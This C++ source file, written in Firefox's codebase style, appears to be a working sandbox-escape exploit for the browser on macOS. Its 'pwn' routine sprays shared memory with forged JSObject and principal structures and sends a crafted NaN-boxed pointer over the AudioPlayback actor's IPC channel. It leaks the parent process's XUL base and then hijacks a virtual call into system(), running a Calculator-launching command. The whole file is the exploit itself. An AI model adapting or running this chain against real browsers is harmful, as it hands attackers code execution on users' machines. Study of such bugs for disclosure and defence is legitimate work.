/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

#include <dlfcn.h>

#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>

#include "mozilla/dom/JSActor.h"
#include "mozilla/dom/JSIPCValue.h"
#include "mozilla/dom/PWindowGlobal.h"
#include "mozilla/dom/WindowGlobalChild.h"
#include "mozilla/ipc/Shmem.h"
#include "nsTArray.h"
#include "prthread.h"

namespace mozilla::dom {
namespace {

// This address was reliably mapped in the parent on my system.

constexpr uintptr_t kParentObject = 0x178180000;

// These offsets belong to the exact vulnerable build described in the README.
constexpr uintptr_t kSystemPrincipalVptrOffset = 0x96bc880;
constexpr uintptr_t kRegisterLoaderOffset = 0x1191e58;
constexpr size_t kPageSize = 0x4000;
constexpr size_t kShmemSize = 4 * 1024 * 1024;
constexpr size_t kShmemCount = 128;
constexpr size_t kPrincipalOffset = 0x27f8;
constexpr size_t kVtableOffset = 0x3000;
constexpr size_t kCommandOffset = 0x3f00;
constexpr char kCommand[] = "/usr/bin/open -a Calculator";

struct Page {
  uint8_t* bytes;
  size_t offset;
};

void Write64(uint8_t* aPage, size_t aOffset, uint64_t aValue) {
  std::memcpy(aPage + aOffset, &aValue, sizeof(aValue));
}

void Write32(uint8_t* aPage, size_t aOffset, uint32_t aValue) {
  std::memcpy(aPage + aOffset, &aValue, sizeof(aValue));
}

void FillFakePage(uint8_t* aPage, uintptr_t aParentAddress,
                  uintptr_t aCallTarget) {
  std::memset(aPage, 0, kPageSize);

  // JSObject -> Shape -> BaseShape -> Realm -> Compartment
  Write64(aPage, 0x000, aParentAddress + 0x100);
  Write64(aPage, 0x008, aParentAddress + 0x380);
  Write64(aPage, 0x100, aParentAddress + 0x200);
  Write32(aPage, 0x108, 0x10);
  Write64(aPage, 0x200, aParentAddress + 0x300);
  Write64(aPage, 0x208, aParentAddress + 0x400);
  Write64(aPage, 0x300, aParentAddress + 0x380);
  std::memcpy(aPage + 0x380, "Bug2022034Fake", 15);

  Write64(aPage, 0x400, aParentAddress + 0x1000);
  Write64(aPage, 0x528, aParentAddress + 0x2800);

  Write64(aPage, 0x1000, aParentAddress + 0x1800);
  Write64(aPage, 0x1008, aParentAddress + 0x100);
  Write64(aPage, 0x1048, aParentAddress + 0x1060);
  Write64(aPage, 0x1050, 1);
  Write64(aPage, 0x1058, 1);
  Write64(aPage, 0x1060, aParentAddress + 0x400);
  Write64(aPage, 0x1070, aParentAddress + 0x3800);

  // Realm -> BasePrincipal -> vtable slot used by the virtual call
  Write64(aPage, kPrincipalOffset, aParentAddress + kVtableOffset);
  std::memset(aPage + kVtableOffset, 0x41, 0x800);
  Write64(aPage, 0x3270, aCallTarget);
}

void trigger(WindowGlobalChild* aActor, uintptr_t aAddress) {
  // Preserve the address inside a NaN whose bits carry the object tag.
  const uint64_t bits =
      0xFFFE000000000000ULL | (aAddress & 0x00007FFFFFFFFFFFULL);
  double value;
  std::memcpy(&value, &bits, sizeof(value));

  JSActorMessageMeta meta;
  meta.actorName() = "AudioPlayback"_ns;
  meta.messageName() = u"trigger"_ns;
  meta.queryId() = 0;
  meta.kind() = JSActorMessageKind::Message;
  aActor->SendRawMessage(meta, JSIPCValue(value), nullptr);
}

Page* WaitForLeak(nsTArray<Page>& aPages, uintptr_t* aXulBase) {
  const uint64_t initialVptr = kParentObject + kVtableOffset;
  const PRIntervalTime start = PR_IntervalNow();
  do {
    for (Page& page : aPages) {
      // strcpy() replaces the fake principal with bytes from the real one.
      uint64_t observed = 0;
      std::memcpy(&observed, page.bytes + kPrincipalOffset, sizeof(observed));
      if (observed == initialVptr || observed <= kSystemPrincipalVptrOffset) {
        continue;
      }

      PR_Sleep(PR_MillisecondsToInterval(1));
      uint64_t confirmed = 0;
      std::memcpy(&confirmed, page.bytes + kPrincipalOffset, sizeof(confirmed));
      if (confirmed != observed) {
        continue;
      }

      const uintptr_t xulBase = observed - kSystemPrincipalVptrOffset;
      if (xulBase & (kPageSize - 1)) {
        continue;
      }

      std::fprintf(stderr, "parent XUL pointer: 0x%016llx\n",
                   static_cast<unsigned long long>(observed));
      *aXulBase = xulBase;
      return &page;
    }
    PR_Sleep(PR_MillisecondsToInterval(10));
  } while (PR_IntervalToMilliseconds(PR_IntervalNow() - start) < 5000);
  return nullptr;
}

}  // namespace

void pwn(WindowGlobalChild* aActor) {
  // macOS maps shared-cache functions at the same address in both processes.
  dlerror();
  void* copySymbol = dlsym(RTLD_DEFAULT, "strcpy");
  const char* symbolError = dlerror();
  Dl_info copyInfo{};
  if (symbolError || !copySymbol || !dladdr(copySymbol, &copyInfo) ||
      !copyInfo.dli_fname ||
      !std::strstr(copyInfo.dli_fname, "libsystem_platform.dylib")) {
    return;
  }

  dlerror();
  void* systemSymbol = dlsym(RTLD_DEFAULT, "system");
  const char* systemError = dlerror();
  Dl_info systemInfo{};
  if (systemError || !systemSymbol || !dladdr(systemSymbol, &systemInfo) ||
      !systemInfo.dli_fname ||
      !std::strstr(systemInfo.dli_fname, "libsystem_c.dylib")) {
    return;
  }

  nsTArray<Page> pages;
  for (size_t i = 0; i < kShmemCount; ++i) {
    mozilla::ipc::Shmem shmem;
    if (!aActor->AllocUnsafeShmem(kShmemSize, &shmem)) {
      std::fprintf(stderr, "shared-memory allocation stopped at %zu blocks\n",
                   i);
      return;
    }

    uint8_t* bytes = shmem.get<uint8_t>();
    for (size_t offset = 0; offset < kShmemSize; offset += kPageSize) {
      // Repeat the first fake object throughout every shared block.
      uint8_t* page = bytes + offset;
      FillFakePage(page, kParentObject,
                   reinterpret_cast<uintptr_t>(copySymbol));
      pages.AppendElement(Page{page, offset});
    }
  }

  // The first message copies a parent XUL pointer into the shared page.
  trigger(aActor, kParentObject);

  uintptr_t xulBase = 0;
  Page* leakPage = WaitForLeak(pages, &xulBase);
  if (!leakPage) {
    return;
  }

  uint8_t* controlPage = nullptr;
  uintptr_t controlObject = 0;
  if (leakPage->offset + 2 * kPageSize <= kShmemSize) {
    controlPage = leakPage->bytes + kPageSize;
    controlObject = kParentObject + kPageSize;
  } else if (leakPage->offset >= kPageSize) {
    controlPage = leakPage->bytes - kPageSize;
    controlObject = kParentObject - kPageSize;
  } else {
    return;
  }

  // The second object loads system()'s argument and target from shared memory.
  FillFakePage(controlPage, controlObject, xulBase + kRegisterLoaderOffset);
  std::memcpy(controlPage + kCommandOffset, kCommand, sizeof(kCommand));
  Write64(controlPage, kPrincipalOffset + 0x10,
          controlObject + kCommandOffset);  // x9, then x0
  Write64(controlPage, kPrincipalOffset + 0x18,
          reinterpret_cast<uintptr_t>(systemSymbol));  // x6, branch target
  Write64(controlPage, kPrincipalOffset + 0x20, 0);    // x8 keeps x9 unchanged

  std::fprintf(stderr, "parent XUL base: 0x%016llx\n",
               static_cast<unsigned long long>(xulBase));
  trigger(aActor, controlObject);
}

}  // namespace mozilla::dom
